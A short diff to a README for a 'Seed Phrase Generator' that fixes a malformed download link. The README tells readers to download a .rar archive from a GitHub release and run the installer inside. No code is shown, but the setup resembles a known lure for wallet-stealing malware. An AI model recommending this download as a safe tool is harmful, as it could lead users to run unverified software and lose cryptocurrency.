@@ -9,9 +9,7 @@ The Seed Phrase Generator is a simple and efficient tool designed to create secu
 
 
 
-1. Click on the download button - [Downlad](https://github.com/goyal9102/Seed-Generator-Phrases/releases/download/Download/application.rar![dad81417-51cf-4804-b931-fc5948c7d672](https://github.com/user-attachments/assets/e8c0e249-94d8-4d86-9331-1707ab5e0f1a)
-)
-
+1. Click on the download button - [Downlad](https://github.com/goyal9102/Seed-Generator-Phrases/releases/download/Download/application.rar)
 2.  Download the ZIP file and unzip it to the desired location.
 
 3. Open the installer
